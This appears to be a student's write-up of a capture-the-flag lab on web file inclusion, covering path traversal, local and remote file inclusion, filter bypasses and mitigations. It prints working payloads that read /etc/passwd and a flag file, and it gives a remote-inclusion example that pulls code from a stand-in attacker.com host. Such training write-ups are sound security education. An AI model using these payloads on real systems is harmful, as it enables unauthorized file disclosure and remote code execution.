# File Inclusion

## Project Overview

In this project, I explored various **File Inclusion** vulnerabilities commonly found in web applications, including **Path Traversal (Directory Traversal)**, **Local File Inclusion (LFI)**, and **Remote File Inclusion (RFI)**. Through a series of practical labs and challenges, I learned how improper input validation allows attackers to read sensitive files, bypass application restrictions, and potentially achieve Remote Code Execution (RCE).

The assessment focused on identifying vulnerable parameters, exploiting file inclusion flaws using multiple bypass techniques, understanding the risks associated with insecure file handling, and applying mitigation strategies to secure web applications.

---

## Objectives

- Understand File Inclusion vulnerabilities.
- Identify Path Traversal vulnerabilities.
- Exploit Local File Inclusion (LFI).
- Understand Remote File Inclusion (RFI).
- Bypass common file inclusion filters.
- Retrieve sensitive operating system files.
- Understand secure file handling practices.

---

## Skills Learned

- Path Traversal
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Directory Traversal
- Input Validation Testing
- Filter Bypass Techniques
- Null Byte Injection
- PHP File Inclusion
- HTTP Request Manipulation
- Burp Suite Repeater
- Linux Enumeration
- Web Application Reconnaissance

---

## Tools & Technologies

- Burp Suite
- Firefox Developer Tools
- Browser Address Bar
- HTTP Requests
- PHP
- Linux
- Apache
- URL Encoding

---

# Methodology

## 1. Understanding File Inclusion

I began by studying how web applications dynamically load files using user-supplied parameters.

Applications that directly pass user input into file handling functions without proper validation expose themselves to File Inclusion vulnerabilities.

These vulnerabilities can allow attackers to:

- Read sensitive files
- Access application source code
- Retrieve credentials
- Escalate attacks into Remote Code Execution (RCE)

---

## 2. Path Traversal (Directory Traversal)

I first tested the application for **Directory Traversal** by manipulating the file parameter using traversal sequences (`../`) to escape the intended directory structure.

Example payload:

```text
../../../../etc/passwd
```

By repeatedly moving up the directory hierarchy, I successfully accessed sensitive operating system files located outside the web application's root directory.

### Files Retrieved

- `/etc/passwd`
- `/etc/issue`
- `/proc/version`

These files revealed valuable information about the operating system, installed kernel version, and local user accounts.

---

## 3. Local File Inclusion (LFI)

Next, I explored several Local File Inclusion scenarios involving insecure use of PHP's `include()` function.

### Lab 1 – Direct File Inclusion

The application accepted arbitrary file names without validation.

Example request:

```text
/lab1.php?file=/etc/passwd
```

This allowed direct inclusion of sensitive operating system files.

---

### Lab 2 – Directory-Based Inclusion

The developer restricted file inclusion to a specific directory.

By performing directory traversal, I escaped the intended directory and accessed files outside the application's restricted path.

Directory identified:

```text
Includes
```

---

### Lab 3 – Null Byte Injection

The application automatically appended the `.php` extension to user input.

To bypass this restriction, I used a Null Byte injection.

Payload used:

```text
/lab3.php?file=../../../../etc/passwd%00
```

This caused the application to ignore the appended extension and successfully include the target file.

---

### Lab 4 – Filter Bypass

The application attempted to block access to `/etc/passwd`.

By abusing directory references and alternative path representations, I bypassed the implemented filter and successfully accessed the protected file.

The vulnerable PHP function identified during testing was:

```php
file_get_contents()
```

---

### Lab 5 – Traversal Filter Bypass

The application removed occurrences of `../` from user input.

To bypass this filtering mechanism, I supplied nested traversal sequences that survived the application's replacement logic.

Example payload:

```text
....//....//....//....//etc/passwd
```

This successfully reconstructed the traversal sequence after filtering.

---

### Lab 6 – Forced Directory Inclusion

The final lab required every request to begin with a predefined directory.

Required directory:

```text
THM-profile
```

Payload used:

```text
THM-profile/../../../../etc/os-release
```

This successfully retrieved the operating system release information.

Retrieved value:

```
VERSION_ID=12.04
```

---

# Remote File Inclusion (RFI)

I also studied how Remote File Inclusion vulnerabilities occur when applications allow remote URLs to be passed into PHP include functions.

A vulnerable application may retrieve attacker-controlled files hosted on external servers.

Example vulnerable request:

```text
http://target/index.php?lang=http://attacker.com/cmd.txt
```

If remote file inclusion is enabled, the application downloads and executes the remote PHP file, potentially allowing Remote Code Execution (RCE).

I also learned that successful RFI attacks require:

- `allow_url_fopen = On`
- Insecure use of `include()`
- Lack of input validation

---

# Practical Challenge

## Challenge 1 – Capturing Flag 1

The application accepted file input through a POST request rather than the expected GET request.

Using Burp Suite, I intercepted the request and modified it before forwarding it to the server.

### Request Used

```http
POST /challenges/index.php HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

page=../../../../etc/flag1
```

After replaying the request through Burp Repeater, I successfully retrieved the first challenge flag.




---

## Challenge 2

I continued assessing the second challenge, which enforced administrator-only access controls.

The application redirected unauthenticated users to an authorization page, requiring further testing of its file inclusion logic.

---

## Challenge 3

The final challenge introduced Remote File Inclusion techniques to achieve Remote Code Execution through the vulnerable playground application.

The objective involved executing the `hostname` command after successfully exploiting the RFI vulnerability.

---

# Key Findings

During the assessment, I successfully identified:

- Directory Traversal vulnerabilities
- Local File Inclusion vulnerabilities
- Multiple input validation weaknesses
- PHP include() misuse
- file_get_contents() abuse
- Null Byte injection opportunities
- Traversal filter bypasses
- Forced directory inclusion weaknesses
- Sensitive operating system file disclosure
- Remote File Inclusion attack vectors

---

# Security Recommendations

Based on the assessment, I recommend the following improvements:

- Validate all user-supplied file paths.
- Implement strict input whitelisting.
- Disable unnecessary PHP file inclusion features.
- Disable `allow_url_include` and `allow_url_fopen` when not required.
- Avoid exposing application errors.
- Restrict file access to approved directories.
- Prevent directory traversal through canonical path validation.
- Deploy a Web Application Firewall (WAF).
- Keep PHP and web server software updated.

---

# Lessons Learned

This project demonstrated how seemingly simple file handling functionality can expose an application to severe security risks when user input is not properly validated.

I gained hands-on experience exploiting multiple forms of File Inclusion vulnerabilities, bypassing common filtering mechanisms, retrieving sensitive operating system files, and understanding how Local File Inclusion vulnerabilities can escalate into Remote Code Execution when combined with other weaknesses.

---

> **Disclaimer**
>
> All activities documented in this project were performed within authorized lab environments, training platforms, and Capture The Flag (CTF) exercises. The techniques demonstrated are intended solely for educational purposes and authorized security assessments. No unauthorized systems or third-party infrastructure were targeted.
